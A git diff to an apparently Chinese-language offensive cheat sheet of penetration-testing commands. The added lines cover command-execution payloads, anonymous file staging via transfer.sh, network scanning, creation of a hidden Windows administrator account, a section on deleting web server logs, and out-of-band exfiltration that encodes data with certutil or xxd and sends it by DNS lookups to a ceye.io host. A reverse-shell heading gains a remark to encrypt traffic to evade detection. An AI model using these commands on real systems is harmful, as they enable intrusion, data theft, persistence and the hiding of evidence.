@@ -17,6 +17,12 @@ https://www.bugku.net/runtime-exec-payloads/
 bash -c {echo,cGluZyAxMjcuMC4wLjE7ZWNobyAxID50ZXN0LnR4dA==}|{base64,-d}|{bash,-i}
 ```
 
+Windows下
+```
+getRuntime().exec(\"cmd /c echo 1 > D://tomcat//webapps//ROOT//90s.txt\");
+```
+
+
 ## 命令执行，定位资源文件写文件回显
 Linux
 ```
@@ -98,14 +104,54 @@ $IFS$9
 powershell -Command "Compress-Archive -Path E:\update\ -DestinationPath E:\test.zip"
 ```
 
+# 匿名文件存储
+可用命令行   
+https://transfer.sh/
+使用很简单   
+```
+上传，成功后返回随机路径
+curl --upload-file ./hello.txt https://transfer.sh/hello.txt
+
+获取
+https://transfer.sh/fF6OA7aF8o/hello.txt
+
+```
+
+
+## nbtscan
+
+```
+nbtscan.exe 10.11.1.0/24
+```
+
+## dos命令存活主机探测
+```
+for /L %I in (1,1,256) DO @ping -w 1 -l 1 192.168.202.%I | findstr "TTL="
+```
 
 
 ## nmap
 
+只执行 ping 扫描。它不会进行任何端口扫描或服务/版本检测
 ```
 nmap -sn 10.11.1.0/24
 ```
 
+SYN扫描，不ping
+```
+sudo nmap -sS -Pn 192.168.10.1/24
+```
+
+udp发包探测存活，比较慢
+```
+sudo nmap -sU -Pn 10.11.1.0/24
+```
+多种方式，进行存活探测(TCP ACK、TCP FIN 和 UDP 数据包来探测主机)
+```
+sudo nmap -PA -Pn 192.168.10.1/24
+```
+
+扫描版本，全端口
 ```
 nmap -sV -p- 10.11.1.0
 ```
@@ -451,6 +497,7 @@ for /L %I in (1,1,256) DO @ping -w 1 -l 1 192.168.202.%I | findstr "TTL="
 ```
 
 
+
 ## gobuster
 
 ```
@@ -479,16 +526,14 @@ python3 dirsearch.py -e php,html,js -u https://target --proxy 127.0.0.1:8080
 python3 dirsearch.py -e php,html,js -u https://target --proxy socks5://10.10.0.1:8080
 ```
 
-## nbtscan
 
-```
-nbtscan.exe 10.11.1.0/24
-```
 
 ## 代理工具
 proxychain   
 sockscap64    
 proxifier   
+ccproxy
+sockscap
 
 https://drive.google.com/drive/folders/1x5naJeK2YkV6QCYUlUg5QNMl1Izf4-ti   
 https://www.mediafire.com/folder/32rj1769a2w82/v4.7   
@@ -533,7 +578,7 @@ https://github.com/Dliv3/Venom
  ssh -T root@192.168.1.1 /usr/bin/bash -i
 ```
 
-## grep
+## grep搜索
 
 ```
 grep -E "([0-9]{1,3}[\.]){3}[0-9]{1,3}" -r xxx --color=auto
@@ -618,6 +663,10 @@ python sqlmap.py -u "www.xxxx.com/product/detail/id/3*.html" --dbms=mysql -v 3
 
 ```
 python sqlmap.py -u "http://www.vuln.cn/post.php?id=1"  --dbms mysql  --dbs
+```
+
+```
+python sqlmap.py -u "http://www.vuln.cn/post.php?id=*"  --dbms mysql  --dbs
 ```
 
 ```
@@ -795,6 +844,11 @@ find /root -name war|while read file;do sh -c "echo $file">$file/finddir.txt;don
 ```
 wmic process where name='mysqld.exe' get processid,executablepath,name
 ```
+程序pid找路径
+```
+wmic process get name,executablepath,processid|findstr pid
+```
+
 启动路径找login.jsp
 ```
 for /f %i in ('dir /s /b D:\UFGOV\U8\login.jsp') do (echo %i)
@@ -880,7 +934,7 @@ useradd -p "$(openssl passwd 123456)" guest
 useradd newuwer;echo -e "123456\n123456\n" |passwd newuser
 ```
 
-### windows
+### windows添加用户
 ```
 net user admin$ Afabab@20 /add
 net localgroup administrators admin$ /add
@@ -1022,6 +1076,20 @@ cd %userprofile%\documents\attrib Default.rdp -s -h
 del Default.rdp
 ```
 
+## 删web日志
+```
+/var/log/nginx/  
+​  
+access.log
+error.log  
+​  
+tomcat 位于 logs  
+catalina.*.log
+access_log.*.txt  
+
+```
+
+
 
 ## 开3389
 ```
@@ -1082,8 +1150,8 @@ updatedb && locate index.php
 进程路径
 wmic process get name,executablepath
 ```
-### 外带oob
-Windows
+### 命令执行无回显外带oob
+#### Windows
 在windows当中，%cd% 代表的是当前目录，我们通过echo将当前目录写入文本temp,然后荣国certutil对文件内容进行base64编码，再过滤certutil携带的字符，将它赋给一个变量，最后通过nslookup外带出来，从而实现获取当前目录的目的。
 ```
 echo %cd% > temp&&certutil -encode temp temp1&&findstr /L /V "CERTIFICATE" temp1 > temp2&&set /p ADDR=<temp2&&nslookup %ADDR%.is1lv6.ceye.io
@@ -1099,8 +1167,43 @@ echo %cd% > temp&&certutil -encode temp temp1&&findstr /L /V "CERTIFICATE" temp1
 如果需要外带多行命令，则需要以下语句：
 ```
 where /R C: login.* > test && certutil -encodehex -f test test.hex 4 && powershell $text=Get-Content test.hex;$sub=$text -replace(' ','');$j=11111;foreach($i in $sub){ $fin=$j.tostring()+'.'+$i+'.is1lv6.ceye.io';$j += 1; nslookup $fin }
-（b）Linux
 ```
+win常用变量
+```
+//变量                     类型       描述
+//%ALLUSERSPROFILE%        本地       返回“所有用户”配置文件的位置。
+//%APPDATA%                本地       返回默认情况下应用程序存储数据的位置。
+//%CD%                     本地       返回当前目录字符串。
+//%CMDCMDLINE%             本地       返回用来启动当前的 Cmd.exe 的准确命令行。
+//%CMDEXTVERSION%          系统       返回当前的“命令处理程序扩展”的版本号。
+//%COMPUTERNAME%           系统       返回计算机的名称。
+//%COMSPEC%                系统       返回命令行解释器可执行程序的准确路径。
+//%DATE%                   系统       返回当前日期。使用与 date /t 命令相同的格式。由 Cmd.exe 生成。有关 date 命令的详细信息，请参阅 Date。
+//%ERRORLEVEL%             系统       返回上一条命令的错误代码。通常用非零值表示错误。
+//%HOMEDRIVE%              系统       返回连接到用户主目录的本地工作站驱动器号。基于主目录值而设置。用户主目录是在“本地用户和组”中指定的。
+//%HOMEPATH%               系统       返回用户主目录的完整路径。基于主目录值而设置。用户主目录是在“本地用户和组”中指定的。
+//%HOMESHARE%              系统       返回用户的共享主目录的网络路径。基于主目录值而设置。用户主目录是在“本地用户和组”中指定的。
+//%LOGONSERVER%            本地       返回验证当前登录会话的域控制器的名称。
+//%NUMBER_OF_PROCESSORS%   系统       指定安装在计算机上的处理器的数目。
+//%OS%                     系统       返回操作系统名称。Windows 2000 显示其操作系统为 Windows_NT。
+//%PATH%                   系统       指定可执行文件的搜索路径。
+//%PATHEXT%                系统       返回操作系统认为可执行的文件扩展名的列表。
+//%PROCESSOR_ARCHITECTURE% 系统       返回处理器的芯片体系结构。值：x86 或 IA64（基于 Itanium）。
+//%PROCESSOR_IDENTFIER%    系统       返回处理器说明。
+//%PROCESSOR_LEVEL%        系统       返回计算机上安装的处理器的型号。
+//%PROCESSOR_REVISION%     系统       返回处理器的版本号。
+//%P ROMPT%                 本地       返回当前解释程序的命令提示符设置。由 Cmd.exe 生成。
+//%RANDOM%                 系统       返回 0 到 32767 之间的任意十进制数字。由 Cmd.exe 生成。
+//%SYSTEMDRIVE%            系统       返回包含 Windows server operating system 根目录（即系统根目录）的驱动器。
+//%SYSTEMROOT%             系统       返回 Windows server operating system 根目录的位置。
+//%TEMP%和%TMP%            系统和用户  返回对当前登录用户可用的应用程序所使用的默认临时目录。有些应用程序需要 TEMP，而其他应用程序则需要 TMP。
+//%TIME%                   系统       返回当前时间。使用与time /t命令相同的格式。由Cmd.exe生成。有关time命令的详细信息，请参阅 Time。
+//%USERDOMAIN%             本地       返回包含用户帐户的域的名称。
+//%USERNAME%               本地       返回当前登录的用户的名称。
+//%USERPROFILE%            本地       返回当前用户的配置文件的位置。
+//%WINDIR%                 系统       返回操作系统目录的位置。
+```
+#### Linux
 在linux中pwd也是查看当前目录的，我们通过tr -d将换行符去掉并通过xxd -ps将值转化为16进制，这样我们即可外带出自己想要的东西。
 ```
 ping pwd|tr -d '\n'|xxd -ps.is1lv6.ceye.io
@@ -1656,7 +1759,7 @@ cme ldap 10.11.12.211 -u 'username' -p 'password' --kdcHost 10.11.12.211 --users
 ```
 
 
-## 反弹shell
+## 反弹shell(流量太敏感，尽量加密用)
 
 ## nc
 
